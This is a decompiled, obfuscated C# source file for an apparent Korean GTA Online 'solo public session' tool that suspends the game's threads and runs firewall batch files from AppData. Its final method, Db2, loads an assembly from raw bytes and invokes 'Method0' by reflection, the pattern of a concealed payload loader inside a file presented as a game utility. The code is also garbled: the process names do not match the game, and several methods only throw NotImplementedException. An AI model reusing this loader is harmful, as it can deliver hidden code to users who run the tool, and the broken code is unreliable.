using System;
using System.Collections;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Ak8;
using Cg6;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Zj6;
using i8Y;
using z0B;

namespace j3Z;

public class q8S
{
	private string logpath;

	private object _ThreadAccess;

	private object _ProcNotier;

	private object _SessionMaker;

	private object _CheckProcSub;

	private object _SessionMakerTime;

	private object _RecentAct;

	private x1S.Ar7 ar7_0 = new x1S.Ar7();

	public object Logbox
	{
		get
		{
			return ar7_0.object_0;
		}
		set
		{
			object objectValue = RuntimeHelpers.GetObjectValue(value);
			ar7_0.object_0 = objectValue;
		}
	}

	private IntPtr OpenThread
	{
		get
		{
			throw new NotImplementedException();
		}
	}

	public object ThreadAccess
	{
		get
		{
			return _ThreadAccess;
		}
		set
		{
			_ThreadAccess = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object ProcNotier
	{
		get
		{
			return _ProcNotier;
		}
		set
		{
			_ProcNotier = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object SessionMaker
	{
		get
		{
			return _SessionMaker;
		}
		set
		{
			_SessionMaker = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object CheckProcSub
	{
		get
		{
			return _CheckProcSub;
		}
		set
		{
			_CheckProcSub = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object CheckProc
	{
		get
		{
			return ar7_0.object_1;
		}
		set
		{
			object objectValue = RuntimeHelpers.GetObjectValue(value);
			ar7_0.object_1 = objectValue;
		}
	}

	public object SessionMakerTime
	{
		get
		{
			return _SessionMakerTime;
		}
		set
		{
			_SessionMakerTime = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public object RecentAct
	{
		get
		{
			return _RecentAct;
		}
		set
		{
			_RecentAct = RuntimeHelpers.GetObjectValue(value);
		}
	}

	public q8S()
	{
		logpath = Path.Combine(((ServerComputer)Cx9.Computer).get_FileSystem().get_SpecialDirectories().get_CurrentUserApplicationData(), "3445tygfdfg.log");
	}

	private void Ya2(object sender, EventArgs e)
	{
		//IL_00cb: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d1: Expected O, but got Unknown
		IComparable<string> comparable = Path.Combine(((ServerComputer)Cx9.Computer).get_FileSystem().get_SpecialDirectories().get_CurrentUserApplicationData(), "fgfgrer4r4.log");
		if (File.Exists(comparable as string))
		{
			NewLateBinding.LateSetComplex(Logbox, (Type)null, "Text", new object[1] { File.ReadAllText((string)comparable) }, (string[])null, (Type[])null, false, true);
			return;
		}
		NewLateBinding.LateSetComplex(Logbox, (Type)null, "Font", new object[1] { (object)new Font(Conversions.ToString(NewLateBinding.LateGet(Logbox, (Type)null, "Font", new object[0], (string[])null, (Type[])null, (bool[])null)), Conversions.ToSingle(Operators.OrObject(NewLateBinding.LateGet(NewLateBinding.LateGet(Logbox, (Type)null, "Font", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Style", new object[0], (string[])null, (Type[])null, (bool[])null), (object)(FontStyle)2))) }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(Logbox, (Type)null, "Text", new object[1] { "\r\r\r\r\r\r\r\r\r" }, (string[])null, (Type[])null, false, true);
	}

	private void Et2(object sender, EventArgs e)
	{
		//IL_009b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a1: Expected O, but got Unknown
		IConvertible convertible = Path.Combine(((ServerComputer)Cx9.Computer).get_FileSystem().get_SpecialDirectories().get_CurrentUserApplicationData(), "gtrrete.log");
		File.Delete((string)convertible);
		NewLateBinding.LateSetComplex(Logbox, (Type)null, "Font", new object[1] { (object)new Font(Conversions.ToString(NewLateBinding.LateGet(Logbox, (Type)null, "Font", new object[0], (string[])null, (Type[])null, (bool[])null)), Conversions.ToSingle(Operators.OrObject(NewLateBinding.LateGet(NewLateBinding.LateGet(Logbox, (Type)null, "Font", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Style", new object[0], (string[])null, (Type[])null, (bool[])null), (object)(FontStyle)2))) }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(Logbox, (Type)null, "Text", new object[1] { "\r\r\r\r\r\r\r\r\r" }, (string[])null, (Type[])null, false, true);
	}

	private void a6R(object sender, EventArgs e)
	{
		//IL_00c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ce: Expected O, but got Unknown
		ICloneable cloneable = Path.Combine(((ServerComputer)Cx9.Computer).get_FileSystem().get_SpecialDirectories().get_CurrentUserApplicationData(), "nmjghrte4.log");
		if (!File.Exists((string)cloneable))
		{
			NewLateBinding.LateSetComplex(Logbox, (Type)null, "Text", new object[1] { "\r\r\r\r\r\r\r\r\r" }, (string[])null, (Type[])null, false, true);
			return;
		}
		NewLateBinding.LateSetComplex(Logbox, (Type)null, "Font", new object[1] { (object)new Font(Conversions.ToString(NewLateBinding.LateGet(Logbox, (Type)null, "Font", new object[0], (string[])null, (Type[])null, (bool[])null)), Conversions.ToSingle(Operators.AndObject(NewLateBinding.LateGet(NewLateBinding.LateGet(Logbox, (Type)null, "Font", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Style", new object[0], (string[])null, (Type[])null, (bool[])null), (object)(FontStyle)0))) }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(Logbox, (Type)null, "Text", new object[1] { File.ReadAllText(cloneable as string) }, (string[])null, (Type[])null, false, true);
	}

	private void q6N(Process x0Z)
	{
		object enumerator = default(object);
		try
		{
			enumerator = x0Z.Threads.GetEnumerator();
			while ((enumerator as IEnumerator).MoveNext())
			{
				object obj = (ProcessThread)(enumerator as IEnumerator).Current;
				IntPtr intPtr = this.get_OpenThread(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(ThreadAccess, (Type)null, "SUSPEND_RESUME", new object[0], (string[])null, (Type[])null, (bool[])null)), p3A: false, (obj as ProcessThread).Id);
				if (intPtr != IntPtr.Zero)
				{
					Wj8(intPtr);
					Se4(intPtr);
				}
			}
		}
		finally
		{
			if (((IEnumerator)enumerator) is IDisposable)
			{
				((enumerator as IEnumerator) as IDisposable).Dispose();
			}
		}
	}

	private void Se4(IntPtr w9L)
	{
		throw new NotImplementedException();
	}

	private void Wj8(IntPtr z1A)
	{
		throw new NotImplementedException();
	}

	private void Ma9(Process Tg4)
	{
		object enumerator = default(object);
		try
		{
			enumerator = Tg4.Threads.GetEnumerator();
			while (((IEnumerator)enumerator).MoveNext())
			{
				object obj = (ProcessThread)(enumerator as IEnumerator).Current;
				IntPtr intPtr = this.get_OpenThread(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(ThreadAccess, (Type)null, "SUSPEND_RESUME", new object[0], (string[])null, (Type[])null, (bool[])null)), p3A: false, ((ProcessThread)obj).Id);
				if (intPtr != IntPtr.Zero)
				{
					Xi1(intPtr);
					Se4(intPtr);
				}
			}
		}
		finally
		{
			if (((IEnumerator)enumerator) is IDisposable)
			{
				((enumerator as IEnumerator) as IDisposable).Dispose();
			}
		}
	}

	private void Xi1(IntPtr Gx6)
	{
		throw new NotImplementedException();
	}

	private void Fe1(object sender, EventArgs e)
	{
		object processesByName = Process.GetProcessesByName("fdfrert");
		if (((Process[])processesByName).Count() >= 1)
		{
			NewLateBinding.LateSetComplex(ProcNotier, (Type)null, "TextAlign", new object[1] { (object)(ContentAlignment)32 }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(ProcNotier, (Type)null, "Text", new object[1] { "    dffgrtrt                 GTA5.exe 감지됨" }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(SessionMaker, (Type)null, "Enabled", new object[1] { true }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateCall(CheckProcSub, (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(CheckProc, (Type)null, "Stop", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
	}

	private void Ye0(object sender, EventArgs e)
	{
		Array processesByName = Process.GetProcessesByName("G543TA5");
		if ((processesByName as Process[]).Count() == 0)
		{
			NewLateBinding.LateSetComplex(SessionMaker, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateSetComplex(ProcNotier, (Type)null, "Text", new object[1] { "GTA5.exe를 찾지 못했습니다.\rGrand Theft Auto V가 실행되었는지 확인하십시오." }, (string[])null, (Type[])null, false, true);
			NewLateBinding.LateCall(CheckProc, (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
			NewLateBinding.LateCall(CheckProcSub, (Type)null, "Stop", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		}
	}

	private void s6C(object sender, EventArgs e)
	{
		Array processesByName = Process.GetProcessesByName("GT4tedrA5");
		q6N((processesByName as Process[])[0]);
		NewLateBinding.LateSetComplex(SessionMaker, (Type)null, "Enabled", new object[1] { false }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(SessionMaker, (Type)null, "Text", new object[1] { "잠시만 기다려 주세요..." }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateCall(SessionMakerTime, (Type)null, "Start", new object[0], (string[])null, (Type[])null, (bool[])null, true);
	}

	private void Ec1(object sender, EventArgs e)
	{
		Array processesByName = Process.GetProcessesByName("GT54eA5");
		Ma9(((Process[])processesByName)[0]);
		NewLateBinding.LateSetComplex(SessionMaker, (Type)null, "Text", new object[1] { "1인 공개세션 만들기" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(SessionMaker, (Type)null, "Enabled", new object[1] { true }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateSetComplex(RecentAct, (Type)null, "Text", new object[1] { "1P Public Session has been created successfully" }, (string[])null, (Type[])null, false, true);
		NewLateBinding.LateCall(SessionMakerTime, (Type)null, "Stop", new object[0], (string[])null, (Type[])null, (bool[])null, true);
		((ServerComputer)Cx9.Computer).get_FileSystem().WriteAllText(logpath, "[" + Conversions.ToString(DateAndTime.get_Now()) + "] 1인 공개세션이 만들어짐\r", true);
	}

	private void Qx6(object sender, EventArgs e)
	{
		object obj = Path.Combine(((ServerComputer)Cx9.Computer).get_FileSystem().get_SpecialDirectories().get_CurrentUserApplicationData(), "AddFirewall.bat");
		Process.Start((string)obj);
		NewLateBinding.LateSetComplex(RecentAct, (Type)null, "Text", new object[1] { " Firewall added completely" }, (string[])null, (Type[])null, false, true);
		((ServerComputer)Cx9.Computer).get_FileSystem().WriteAllText(logpath, "[" + Conversions.ToString(DateAndTime.get_Now()) + "] GTA 온라인 세션 방화벽이 생성됨\r", true);
	}

	private void Qp6(object sender, EventArgs e)
	{
		object obj = Path.Combine(((ServerComputer)Cx9.Computer).get_FileSystem().get_SpecialDirectories().get_CurrentUserApplicationData(), "DelFirewall.bat");
		Process.Start((string)obj);
		NewLateBinding.LateSetComplex(RecentAct, (Type)null, "Text", new object[1] { " Firewall removed completely" }, (string[])null, (Type[])null, false, true);
		((ServerComputer)Cx9.Computer).get_FileSystem().WriteAllText(logpath, "[" + Conversions.ToString(DateAndTime.get_Now()) + "] GTA 온라인 세션 방화벽이 제거됨\r", true);
	}

	private void z2X(object sender, EventArgs e)
	{
		object obj = new Xx9();
		((Control)(Xx9)obj).Show();
	}

	private void Cz9(object sender, EventArgs e)
	{
		object obj = new f2K();
		((Control)(f2K)obj).Show();
	}

	internal static void Db2(byte[] w8Z, int e5T, int Fq9)
	{
		object objectValue = RuntimeHelpers.GetObjectValue(Pa1.Ne1(e5T % checked(Fq9 + 6), w8Z));
		NewLateBinding.LateCall(NewLateBinding.LateGet(objectValue, (Type)null, "GetTypes", new object[1] { 24 }, (string[])null, (Type[])null, (bool[])null), (Type)null, "InvokeMember", new object[5]
		{
			"Method0",
			256,
			null,
			null,
			new object[0]
		}, (string[])null, (Type[])null, (bool[])null, true);
	}
}
